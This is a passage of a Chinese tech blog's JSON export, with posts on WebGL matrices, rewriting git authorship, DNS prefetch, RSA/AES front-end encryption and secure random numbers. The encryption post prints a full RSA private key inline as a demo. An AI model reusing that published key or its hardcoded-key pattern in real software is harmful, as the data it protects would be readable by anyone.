mat4Angles.mul(mat4Scale).mul(mat4Translate);\n        //获取uniform变量的下标\n        const matrix = gl.getUniformLocation(program, 'matrix');\n        // 赋值\n        gl.uniformMatrix4fv(matrix, false, mat4.data)\n\n</code></pre>\n<blockquote>\n<p>demo</p>\n</blockquote>\n<p><a href=\"http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo3/deploy/index.html\">demo</a><br>\n<a href=\"https://github.com/laopo001/webgl-learn/tree/master/src/demo3\">github</a></p>\n<!--kg-card-end: markdown-->","comment_id":"155","plaintext":"shader如下\nattribute vec4 position;  \nuniform mat4 matrix;\nvoid main(void){  \n    gl_Position = matrix * position;\n    gl_PointSize = 10.0;\n}  \n\nvoid main(void){  \n    gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);  \n}  \n\n\n这里通过matrix 一个4*4矩阵来变换。通过uniform变量来传递。\n\n> uniform 变量\n\n\n我们已经知道了如何从js中向顶点着色器的attribute变量传递数据，这里有个新的变量uniform，它用来从js中向顶点or片元着色器传输一致的（不变的）\n数据。如下使用\n\n        // 以z轴为中心，旋转90度\n        let mat4Angles = new Mat4().setFromEulerAngles(0, 0, 90);\n        // x,y缩放1.5倍\n        let mat4Scale = new Mat4().setScale(1.5, 1.5, 1);\n        // x,y位移0.2\n        let mat4Translate = new Mat4().setTranslate(0.2, 0.2, 0.2);\n        // 矩阵相乘\n        let mat4 = mat4Angles.mul(mat4Scale).mul(mat4Translate);\n        //获取uniform变量的下标\n        const matrix = gl.getUniformLocation(program, 'matrix');\n        // 赋值\n        gl.uniformMatrix4fv(matrix, false, mat4.data)\n\n\n\n> demo\n\n\ndemo\n[http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo3/deploy/index.html]\ngithub [https://github.com/laopo001/webgl-learn/tree/master/src/demo3]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-21T10:47:45.000Z","created_by":"1","updated_at":"2018-05-21T11:07:32.000Z","updated_by":"1","published_at":"2018-05-21T10:54:04.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d358","uuid":"75658681-c510-4acd-949d-856f89fda243","title":"(Untitled)","slug":"untitled-7","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![](/content/images/2018/05/QQ--20180526151142-1.png)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><img src=\"/content/images/2018/05/QQ--20180526151142-1.png\" alt=\"\"></p>\n<!--kg-card-end: markdown-->","comment_id":"156","plaintext":null,"feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-26T07:08:26.000Z","created_by":"1","updated_at":"2018-05-26T07:12:34.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d359","uuid":"eefde244-bd93-42a5-b048-d517e2720727","title":"修改git全部已提交的用户名和邮箱","slug":"untitled-8","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"[原文](https://help.github.com/articles/changing-author-info/)\\n\\n```\\n#!/bin/sh\\n\\ngit filter-branch -f --env-filter '\\nOLD_EMAIL=\\\"liaodh@jpush.com\\\"\\nCORRECT_NAME=\\\"laopo001\\\"\\nCORRECT_EMAIL=\\\"353272497@qq.com\\\"\\nif [ \\\"$GIT_COMMITTER_EMAIL\\\" = \\\"$OLD_EMAIL\\\" ]\\nthen\\n    export GIT_COMMITTER_NAME=\\\"$CORRECT_NAME\\\"\\n    export GIT_COMMITTER_EMAIL=\\\"$CORRECT_EMAIL\\\"\\nfi\\nif [ \\\"$GIT_AUTHOR_EMAIL\\\" = \\\"$OLD_EMAIL\\\" ]\\nthen\\n    export GIT_AUTHOR_NAME=\\\"$CORRECT_NAME\\\"\\n    export GIT_AUTHOR_EMAIL=\\\"$CORRECT_EMAIL\\\"\\nfi\\n' --tag-name-filter cat -- --branches --tags\\n```\\n\\n```\\ngit push --force --tags origin 'refs/heads/*'\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><a href=\"https://help.github.com/articles/changing-author-info/\">原文</a></p>\n<pre><code>#!/bin/sh\n\ngit filter-branch -f --env-filter '\nOLD_EMAIL=&quot;liaodh@jpush.com&quot;\nCORRECT_NAME=&quot;laopo001&quot;\nCORRECT_EMAIL=&quot;353272497@qq.com&quot;\nif [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]\nthen\n    export GIT_COMMITTER_NAME=&quot;$CORRECT_NAME&quot;\n    export GIT_COMMITTER_EMAIL=&quot;$CORRECT_EMAIL&quot;\nfi\nif [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]\nthen\n    export GIT_AUTHOR_NAME=&quot;$CORRECT_NAME&quot;\n    export GIT_AUTHOR_EMAIL=&quot;$CORRECT_EMAIL&quot;\nfi\n' --tag-name-filter cat -- --branches --tags\n</code></pre>\n<pre><code>git push --force --tags origin 'refs/heads/*'\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"157","plaintext":"原文 [https://help.github.com/articles/changing-author-info/]\n\n#!/bin/sh\n\ngit filter-branch -f --env-filter '\nOLD_EMAIL=\"liaodh@jpush.com\"\nCORRECT_NAME=\"laopo001\"\nCORRECT_EMAIL=\"353272497@qq.com\"\nif [ \"$GIT_COMMITTER_EMAIL\" = \"$OLD_EMAIL\" ]\nthen\n    export GIT_COMMITTER_NAME=\"$CORRECT_NAME\"\n    export GIT_COMMITTER_EMAIL=\"$CORRECT_EMAIL\"\nfi\nif [ \"$GIT_AUTHOR_EMAIL\" = \"$OLD_EMAIL\" ]\nthen\n    export GIT_AUTHOR_NAME=\"$CORRECT_NAME\"\n    export GIT_AUTHOR_EMAIL=\"$CORRECT_EMAIL\"\nfi\n' --tag-name-filter cat -- --branches --tags\n\n\ngit push --force --tags origin 'refs/heads/*'","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-06-06T11:54:57.000Z","created_by":"1","updated_at":"2018-10-03T03:17:41.000Z","updated_by":"1","published_at":"2018-06-06T12:19:27.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d35a","uuid":"989b3d9d-78fd-469e-a41a-1df9747eed58","title":"前端加载优化2","slug":"qian-duan-jia-zai-you-hua","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"### DNS 预读取\\nDNS 作为互联网的基础协议，其解析的速度似乎很容易被网站优化人员忽视。现在大多数新浏览器已经针对DNS解析进行了优化，典型的一次DNS解析需要耗费 20-120 毫秒，减少DNS解析时间和次数是个很好的优化方式。DNS Prefetching 是让具有此属性的域名不需要用户点击链接就在后台解析，而域名解析和内容载入是串行的网络操作，所以这个方式能 减少用户的等待时间，提升用户体验 。\\n\\n* 打开和关闭 DNS 预读取\\n * 通过response header\\n\\n     `X-DNS-Prefetch-Control: on \\n       X-DNS-Prefetch-Control: off`\\n * 通过<meta> 标签\\n     `<meta http-equiv=\\\"x-dns-prefetch-control\\\" content=\\\"off\\\">`\\n* 强制查询特定主机名(`<link>` 元素也可以使用不完整的 URL 的主机名来标记预解析，但这些主机名前必需要有双斜线：)\\n\\n     `<link rel=\\\"dns-prefetch\\\" href=\\\"http://www.spreadfirefox.com/\\\">`\\n\\n     `<link rel=\\\"dns-prefetch\\\" href=\\\"//www.spreadfirefox.com\\\">`\\n\\n\\n### WebP图片格式\\nWebP是Google新推出的影像技术，它可让网页图档有效进行压缩，同时又不影响图片格式兼容与实际清晰度，进而让整体网页下载速度加快。\\n[gulp-webp](https://github.com/sindresorhus/gulp-webp)这个转WebP的gulp插件还是蛮好用的。\\n不过WebP的图像格式，在浏览器上面兼容还不够好。\\n![](/content/images/2018/06/QQ--20180613234153.png)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h3 id=\"dns\">DNS 预读取</h3>\n<p>DNS 作为互联网的基础协议，其解析的速度似乎很容易被网站优化人员忽视。现在大多数新浏览器已经针对DNS解析进行了优化，典型的一次DNS解析需要耗费 20-120 毫秒，减少DNS解析时间和次数是个很好的优化方式。DNS Prefetching 是让具有此属性的域名不需要用户点击链接就在后台解析，而域名解析和内容载入是串行的网络操作，所以这个方式能 减少用户的等待时间，提升用户体验 。</p>\n<ul>\n<li>\n<p>打开和关闭 DNS 预读取</p>\n</li>\n<li>\n<p>通过response header</p>\n<p><code>X-DNS-Prefetch-Control: on      X-DNS-Prefetch-Control: off</code></p>\n</li>\n<li>\n<p>通过<meta> 标签<br>\n<code>&lt;meta http-equiv=&quot;x-dns-prefetch-control&quot; content=&quot;off&quot;&gt;</code></p>\n</li>\n<li>\n<p>强制查询特定主机名(<code>&lt;link&gt;</code> 元素也可以使用不完整的 URL 的主机名来标记预解析，但这些主机名前必需要有双斜线：)</p>\n<p><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://www.spreadfirefox.com/&quot;&gt;</code></p>\n<p><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//www.spreadfirefox.com&quot;&gt;</code></p>\n</li>\n</ul>\n<h3 id=\"webp\">WebP图片格式</h3>\n<p>WebP是Google新推出的影像技术，它可让网页图档有效进行压缩，同时又不影响图片格式兼容与实际清晰度，进而让整体网页下载速度加快。<br>\n<a href=\"https://github.com/sindresorhus/gulp-webp\">gulp-webp</a>这个转WebP的gulp插件还是蛮好用的。<br>\n不过WebP的图像格式，在浏览器上面兼容还不够好。<br>\n<img src=\"/content/images/2018/06/QQ--20180613234153.png\" alt=\"\"></p>\n<!--kg-card-end: markdown-->","comment_id":"158","plaintext":"DNS 预读取\nDNS 作为互联网的基础协议，其解析的速度似乎很容易被网站优化人员忽视。现在大多数新浏览器已经针对DNS解析进行了优化，典型的一次DNS解析需要耗费\n20-120 毫秒，减少DNS解析时间和次数是个很好的优化方式。DNS Prefetching\n是让具有此属性的域名不需要用户点击链接就在后台解析，而域名解析和内容载入是串行的网络操作，所以这个方式能 减少用户的等待时间，提升用户体验 。\n\n * 打开和关闭 DNS 预读取\n   \n   \n * 通过response header\n   \n   X-DNS-Prefetch-Control: on X-DNS-Prefetch-Control: off\n   \n   \n * 通过 标签\n   <meta http-equiv=\"x-dns-prefetch-control\" content=\"off\">\n   \n   \n * 强制查询特定主机名(<link> 元素也可以使用不完整的 URL 的主机名来标记预解析，但这些主机名前必需要有双斜线：)\n   \n   <link rel=\"dns-prefetch\" href=\"http://www.spreadfirefox.com/\">\n   \n   <link rel=\"dns-prefetch\" href=\"//www.spreadfirefox.com\">\n   \n   \n\nWebP图片格式\nWebP是Google新推出的影像技术，它可让网页图档有效进行压缩，同时又不影响图片格式兼容与实际清晰度，进而让整体网页下载速度加快。\ngulp-webp [https://github.com/sindresorhus/gulp-webp]这个转WebP的gulp插件还是蛮好用的。\n不过WebP的图像格式，在浏览器上面兼容还不够好。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-06-11T08:04:38.000Z","created_by":"1","updated_at":"2018-06-13T15:42:27.000Z","updated_by":"1","published_at":"2018-06-13T15:40:33.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d35b","uuid":"8210d832-7c36-4918-952f-1df25afdb410","title":"前端加密","slug":"qian-duan-jia-mi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"有时，在数据传输的过程要加密，一般在前端生成16位的随机字符串加上iv(初始偏移向量)，使用aes对数据加密，然后把key用后端提供的公钥进行rsa加密。\\n\\n### aes加密\\n\\n\\n\\n\\n### rsa加密\\n[Node-RSA](https://github.com/rzcoder/node-rsa)一个rsa加密的库，也可以浏览器中使用。\\n\\n RSA是一种块加密的算法，所以对于明文需要将他们分成固定的块长度，考虑到输入的数据长度的问题，所以加解密的填充有好几种：\\n\\n* 无填充，就是直接对明文进行加密\\n\\n* PKCS1。将数据长度分成密钥长度-11byte，比如密钥是1024bit，那么长度就是1024/8-11=117bytes，具体的格式：先填0，2，然后随机生成其他的byte，后面才是真正的数据\\n\\n* PKCS1_OAEP将数据长度分成密钥长度-41byte，比如密钥是1024bit，那么长度就是1024/8-41=77bytes，先填0，随机或者是固定的测试向量加20个bytes，然后加20个数字签名的数据，最后才是数据\\n\\n* SSLV23，将数据长度分成密钥长度-11byte，比如密钥是1024bit，那么长度就是1024/8-11=117bytes，具体的格式：先填0，2，填入8个3，填入一个'\\\\0'，最后才是真正的数据。\\n\\n在node-rsa模块中加解密默认使用 pkcs1_oaep ,如果有些js库使用pkcs1加密,请设置`key.setOptions({encryptionScheme: 'pkcs1'}) `\\n\\n```\\nconst NodeRSA = require('node-rsa');\\n\\nconst key = new NodeRSA();\\n// key.setOptions({encryptionScheme: 'pkcs1'}) \\nkey.importKey(`-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDBDlbS4dYbs27KFuO3ajDLZ12\\nRbFk5UpcEYuoTHmxs0n8/V3DL8FjdQJ3k0RSOGRPgFSQltSYEL+Er4GRmJ7nt0+b\\nlkSdFTmTZ2disYD9Odf2L0jnI4L2DGbPN1OPUxMsbZUCZ1EmneC5WoTlPpH88s0r\\nh+dbC34qxGVNl3DpMwIDAQAB\\n-----END PUBLIC KEY-----`, 'pkcs8-public');\\nlet encrypted = key.encrypt('Hello RSA!', 'base64');\\nconsole.log(encrypted);\\n\\nconst priKey = new NodeRSA();\\n// priKey.setOptions({encryptionScheme: 'pkcs1'}) \\npriKey.importKey(`-----BEGIN RSA PRIVATE KEY-----\\nMIICXQIBAAKBgQDDBDlbS4dYbs27KFuO3ajDLZ12RbFk5UpcEYuoTHmxs0n8/V3D\\nL8FjdQJ3k0RSOGRPgFSQltSYEL+Er4GRmJ7nt0+blkSdFTmTZ2disYD9Odf2L0jn\\nI4L2DGbPN1OPUxMsbZUCZ1EmneC5WoTlPpH88s0rh+dbC34qxGVNl3DpMwIDAQAB\\nAoGBAIdkm12i5mijJPpXXpmlktFPDg9a+3oNJr8c/1TtI2AYFborPbmRojYmunvC\\nJqDeveXkNtHbpeWdWxoHr3EiAM+vralpcN8l2Lg8TKltBCiMsHUiLrTcAfBTEp1X\\nfCwUNNjNiB1AK3H7v0JHfGeQZqre8SWK1C8qjAjEi9x2DDLBAkEA86k3bj8fb566\\nyyH9ub4Jq/sOd/r8urXHXMbLTUUw+ysI5VdCQ3pdOnLQT2hee/kqGgKZqI+S+/Zp\\nkhhj1F5RGwJBAMzkY0Lbj0xk0jxTOb9xoVY5Qec4LkVLae/zpLRIMAZi/ZjYWP7n\\nUOvIe8lKTtRXW/a5NyFjBePxD84Os8h4YckCQQDAJjfCRyEhQwmHW3zdV1IFP+y/\\nDTz0eJmJPnPgsanYyK0xPsjQsdSHXTeNB39LQMjEzjwiw2ZkMIQ8Y+OF/AL1AkAP\\nibplVZU2a+btoDoe5JUhntH6oO4RXzi3c7in21mZAmTM9Is7OXuPhfKtPy9fNwjI\\nWx9tLr9BnARg0gicSVTRAkAx/lM1JEu0ETIvt6GJiXGXCi95Pj88uD6DCrEzl0oi\\nOUVnq5h/vXpTmEjGmNzluC8bwNWxIQp61isBtdMvYChO\\n-----END RSA PRIVATE KEY-----`, 'pkcs1')\\nvar decrypted = priKey.decrypt(encrypted, 'utf8');\\nconsole.log(decrypted);\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>有时，在数据传输的过程要加密，一般在前端生成16位的随机字符串加上iv(初始偏移向量)，使用aes对数据加密，然后把key用后端提供的公钥进行rsa加密。</p>\n<h3 id=\"aes\">aes加密</h3>\n<h3 id=\"rsa\">rsa加密</h3>\n<p><a href=\"https://github.com/rzcoder/node-rsa\">Node-RSA</a>一个rsa加密的库，也可以浏览器中使用。</p>\n<p>RSA是一种块加密的算法，所以对于明文需要将他们分成固定的块长度，考虑到输入的数据长度的问题，所以加解密的填充有好几种：</p>\n<ul>\n<li>\n<p>无填充，就是直接对明文进行加密</p>\n</li>\n<li>\n<p>PKCS1。将数据长度分成密钥长度-11byte，比如密钥是1024bit，那么长度就是1024/8-11=117bytes，具体的格式：先填0，2，然后随机生成其他的byte，后面才是真正的数据</p>\n</li>\n<li>\n<p>PKCS1_OAEP将数据长度分成密钥长度-41byte，比如密钥是1024bit，那么长度就是1024/8-41=77bytes，先填0，随机或者是固定的测试向量加20个bytes，然后加20个数字签名的数据，最后才是数据</p>\n</li>\n<li>\n<p>SSLV23，将数据长度分成密钥长度-11byte，比如密钥是1024bit，那么长度就是1024/8-11=117bytes，具体的格式：先填0，2，填入8个3，填入一个'\\0'，最后才是真正的数据。</p>\n</li>\n</ul>\n<p>在node-rsa模块中加解密默认使用 pkcs1_oaep ,如果有些js库使用pkcs1加密,请设置<code>key.setOptions({encryptionScheme: 'pkcs1'}) </code></p>\n<pre><code>const NodeRSA = require('node-rsa');\n\nconst key = new NodeRSA();\n// key.setOptions({encryptionScheme: 'pkcs1'}) \nkey.importKey(`-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDBDlbS4dYbs27KFuO3ajDLZ12\nRbFk5UpcEYuoTHmxs0n8/V3DL8FjdQJ3k0RSOGRPgFSQltSYEL+Er4GRmJ7nt0+b\nlkSdFTmTZ2disYD9Odf2L0jnI4L2DGbPN1OPUxMsbZUCZ1EmneC5WoTlPpH88s0r\nh+dbC34qxGVNl3DpMwIDAQAB\n-----END PUBLIC KEY-----`, 'pkcs8-public');\nlet encrypted = key.encrypt('Hello RSA!', 'base64');\nconsole.log(encrypted);\n\nconst priKey = new NodeRSA();\n// priKey.setOptions({encryptionScheme: 'pkcs1'}) \npriKey.importKey(`-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQDDBDlbS4dYbs27KFuO3ajDLZ12RbFk5UpcEYuoTHmxs0n8/V3D\nL8FjdQJ3k0RSOGRPgFSQltSYEL+Er4GRmJ7nt0+blkSdFTmTZ2disYD9Odf2L0jn\nI4L2DGbPN1OPUxMsbZUCZ1EmneC5WoTlPpH88s0rh+dbC34qxGVNl3DpMwIDAQAB\nAoGBAIdkm12i5mijJPpXXpmlktFPDg9a+3oNJr8c/1TtI2AYFborPbmRojYmunvC\nJqDeveXkNtHbpeWdWxoHr3EiAM+vralpcN8l2Lg8TKltBCiMsHUiLrTcAfBTEp1X\nfCwUNNjNiB1AK3H7v0JHfGeQZqre8SWK1C8qjAjEi9x2DDLBAkEA86k3bj8fb566\nyyH9ub4Jq/sOd/r8urXHXMbLTUUw+ysI5VdCQ3pdOnLQT2hee/kqGgKZqI+S+/Zp\nkhhj1F5RGwJBAMzkY0Lbj0xk0jxTOb9xoVY5Qec4LkVLae/zpLRIMAZi/ZjYWP7n\nUOvIe8lKTtRXW/a5NyFjBePxD84Os8h4YckCQQDAJjfCRyEhQwmHW3zdV1IFP+y/\nDTz0eJmJPnPgsanYyK0xPsjQsdSHXTeNB39LQMjEzjwiw2ZkMIQ8Y+OF/AL1AkAP\nibplVZU2a+btoDoe5JUhntH6oO4RXzi3c7in21mZAmTM9Is7OXuPhfKtPy9fNwjI\nWx9tLr9BnARg0gicSVTRAkAx/lM1JEu0ETIvt6GJiXGXCi95Pj88uD6DCrEzl0oi\nOUVnq5h/vXpTmEjGmNzluC8bwNWxIQp61isBtdMvYChO\n-----END RSA PRIVATE KEY-----`, 'pkcs1')\nvar decrypted = priKey.decrypt(encrypted, 'utf8');\nconsole.log(decrypted);\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"159","plaintext":"有时，在数据传输的过程要加密，一般在前端生成16位的随机字符串加上iv(初始偏移向量)，使用aes对数据加密，然后把key用后端提供的公钥进行rsa加密。\n\naes加密\nrsa加密\nNode-RSA [https://github.com/rzcoder/node-rsa]一个rsa加密的库，也可以浏览器中使用。\n\nRSA是一种块加密的算法，所以对于明文需要将他们分成固定的块长度，考虑到输入的数据长度的问题，所以加解密的填充有好几种：\n\n * 无填充，就是直接对明文进行加密\n   \n   \n * PKCS1。将数据长度分成密钥长度-11byte，比如密钥是1024bit，那么长度就是1024/8-11=117bytes，具体的格式：先填0，2，然后随机生成其他的byte，后面才是真正的数据\n   \n   \n * PKCS1_OAEP将数据长度分成密钥长度-41byte，比如密钥是1024bit，那么长度就是1024/8-41=77bytes，先填0，随机或者是固定的测试向量加20个bytes，然后加20个数字签名的数据，最后才是数据\n   \n   \n * SSLV23，将数据长度分成密钥长度-11byte，比如密钥是1024bit，那么长度就是1024/8-11=117bytes，具体的格式：先填0，2，填入8个3，填入一个'\\0'，最后才是真正的数据。\n   \n   \n\n在node-rsa模块中加解密默认使用 pkcs1_oaep ,如果有些js库使用pkcs1加密,请设置\nkey.setOptions({encryptionScheme: 'pkcs1'}) \n\nconst NodeRSA = require('node-rsa');\n\nconst key = new NodeRSA();\n// key.setOptions({encryptionScheme: 'pkcs1'}) \nkey.importKey(`-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDBDlbS4dYbs27KFuO3ajDLZ12\nRbFk5UpcEYuoTHmxs0n8/V3DL8FjdQJ3k0RSOGRPgFSQltSYEL+Er4GRmJ7nt0+b\nlkSdFTmTZ2disYD9Odf2L0jnI4L2DGbPN1OPUxMsbZUCZ1EmneC5WoTlPpH88s0r\nh+dbC34qxGVNl3DpMwIDAQAB\n-----END PUBLIC KEY-----`, 'pkcs8-public');\nlet encrypted = key.encrypt('Hello RSA!', 'base64');\nconsole.log(encrypted);\n\nconst priKey = new NodeRSA();\n// priKey.setOptions({encryptionScheme: 'pkcs1'}) \npriKey.importKey(`-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQDDBDlbS4dYbs27KFuO3ajDLZ12RbFk5UpcEYuoTHmxs0n8/V3D\nL8FjdQJ3k0RSOGRPgFSQltSYEL+Er4GRmJ7nt0+blkSdFTmTZ2disYD9Odf2L0jn\nI4L2DGbPN1OPUxMsbZUCZ1EmneC5WoTlPpH88s0rh+dbC34qxGVNl3DpMwIDAQAB\nAoGBAIdkm12i5mijJPpXXpmlktFPDg9a+3oNJr8c/1TtI2AYFborPbmRojYmunvC\nJqDeveXkNtHbpeWdWxoHr3EiAM+vralpcN8l2Lg8TKltBCiMsHUiLrTcAfBTEp1X\nfCwUNNjNiB1AK3H7v0JHfGeQZqre8SWK1C8qjAjEi9x2DDLBAkEA86k3bj8fb566\nyyH9ub4Jq/sOd/r8urXHXMbLTUUw+ysI5VdCQ3pdOnLQT2hee/kqGgKZqI+S+/Zp\nkhhj1F5RGwJBAMzkY0Lbj0xk0jxTOb9xoVY5Qec4LkVLae/zpLRIMAZi/ZjYWP7n\nUOvIe8lKTtRXW/a5NyFjBePxD84Os8h4YckCQQDAJjfCRyEhQwmHW3zdV1IFP+y/\nDTz0eJmJPnPgsanYyK0xPsjQsdSHXTeNB39LQMjEzjwiw2ZkMIQ8Y+OF/AL1AkAP\nibplVZU2a+btoDoe5JUhntH6oO4RXzi3c7in21mZAmTM9Is7OXuPhfKtPy9fNwjI\nWx9tLr9BnARg0gicSVTRAkAx/lM1JEu0ETIvt6GJiXGXCi95Pj88uD6DCrEzl0oi\nOUVnq5h/vXpTmEjGmNzluC8bwNWxIQp61isBtdMvYChO\n-----END RSA PRIVATE KEY-----`, 'pkcs1')\nvar decrypted = priKey.decrypt(encrypted, 'utf8');\nconsole.log(decrypted);","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-06-13T15:10:32.000Z","created_by":"1","updated_at":"2018-06-14T03:16:50.000Z","updated_by":"1","published_at":"2018-06-13T15:18:21.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d35c","uuid":"ded227d1-2edb-450f-aca9-f88b736adffb","title":"js获取安全的随机数","slug":"jshuo-qu-sui-ji-shu-di-er-chong-fang-fa","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"常见的获取随机数是Math.random(),生成[0，1)中间浮点数，包括0，但是不能提供像密码一样安全的随机数字，不能使用它们来处理有关安全加密的事情。\\n\\n如果需要处理加密的问题（如RSA算法），使用Web Crypto API 来代替, 和更精确的window.crypto.getRandomValues() 方法。这个api可以在IE11，firefox,chrome等浏览器上。如果需要兼容低版本IE，使用Math.random()模拟，只是不太安全。\\n\\n\\n> window.crypto.getRandomValues\\n```\\nvar array = new Uint32Array(10);\\nwindow.crypto.getRandomValues(array);\\n\\nconsole.log(\\\"Your lucky numbers:\\\");\\nfor (var i = 0; i < array.length; i++) {\\n    console.log(array[i]);\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>常见的获取随机数是Math.random(),生成[0，1)中间浮点数，包括0，但是不能提供像密码一样安全的随机数字，不能使用它们来处理有关安全加密的事情。</p>\n<p>如果需要处理加密的问题（如RSA算法），使用Web Crypto API 来代替, 和更精确的window.crypto.getRandomValues() 方法。这个api可以在IE11，firefox,chrome等浏览器上。如果需要兼容低版本IE，使用Math.random()模拟，只是不太安全。</p>\n<blockquote>\n<p>window.crypto.getRandomValues</p>\n</blockquote>\n<pre><code>var array = new Uint32Array(10);\nwindow.crypto.getRandomValues(array);\n\nconsole.log(&quot;Your lucky numbers:&quot;);\nfor (var i = 0; i &lt; array.length; i++) {\n    console.log(array[i]);\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"160","plaintext":"常见的获取随机数是Math.random(),生成[0，1)中间浮点数，包括0，但是不能提供像密码一样安全的随机数字，不能使用它们来处理有关安全加密的事情。\n\n如果需要处理加密的问题（如RSA算法），使用Web Crypto API 来代替, 和更精确的window.crypto.getRandomValues()\n方法。这个api可以在IE11，firefox,chrome等浏览器上。如果需要兼容低版本IE，使用Math.random()模拟，只是不太安全。\n\n> window.crypto.getRandomValues\n\n\nvar array = new Uint32Array(10);\nwindow.crypto.getRandomValues(array);\n\nconsole.log(\"Your lucky numbers:\");\nfor (var i = 0; i < array.length; i++) {\n    console.log(array[i]);\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-06-15T02:52:20.000Z","created_by":"1","updated_at":"2018-06-15T03:01:29.000Z","updated_by":"1","published_at":"2018-06-15T03:00:20.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d35d","uuid":"56df15df-30ed-4c2b-9849-7eb05cb89e37","title":"performance","slug":"performance","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"这个一个性能分析的对象。\\n\\n> performance.timing\\n\\n```\\n/ 计算加载时间\\nfunction getPerformanceTiming () {  \\n    var performance = window.performance;\\n \\n    if (!performance) {\\n        // 当前浏览器不支持\\n        console.log('你的浏览器不支持 performance 接口');\\n        return;\\n    }\\n \\n    var t = performance.timing;\\n    var times = {};\\n \\n    //【重要】页面加载完成的时间\\n    //【原因】这几乎代表了用户等待页面可用的时间\\n    times.loadPage = t.loadEventEnd - t.navigationStart;\\n \\n    //【重要】解析 DOM 树结构的时间\\n    //【原因】反省下你的 DOM 树嵌套是不是太多了！\\n    times.domReady = t.domComplete - t.responseEnd;\\n \\n    //【重要】重定向的时间\\n    //【原因】拒绝重定向！比如，http://example.com/ 就不该写成 http://example.com\\n    times.redirect = t.redirectEnd - t.redirectStart;\\n \\n    //【重要】DNS 查询时间\\n    //【原因】DNS 预加载做了么？页面内是不是使用了太多不同的域名导致域名查询的时间太长？\\n    // 可使用 HTML5 Prefetch 预查询 DNS ，见：[HTML5 prefetch](http://segmentfault.com/a/1190000000633364)            \\n    times.lookupDomain = t.domainLookupEnd - t.domainLookupStart;\\n \\n    //【重要】读取页面第一个字节的时间\\n    //【原因】这可以理解为用户拿到你的资源占用的时间，加异地机房了么，加CDN 处理了么？加带宽了么？加 CPU 运算速度了么？\\n    // TTFB 即 Time To First Byte 的意思\\n    // 维基百科：https://en.wikipedia.org/wiki/Time_To_First_Byte\\n    times.ttfb = t.responseStart - t.navigationStart;\\n \\n    //【重要】内容加载完成的时间\\n    //【原因】页面内容经过 gzip 压缩了么，静态资源 css/js 等压缩了么？\\n    times.request = t.responseEnd - t.requestStart;\\n \\n    //【重要】执行 onload 回调函数的时间\\n    //【原因】是否太多不必要的操作都放到 onload 回调函数里执行了，考虑过延迟加载、按需加载的策略么？\\n    times.loadEvent = t.loadEventEnd - 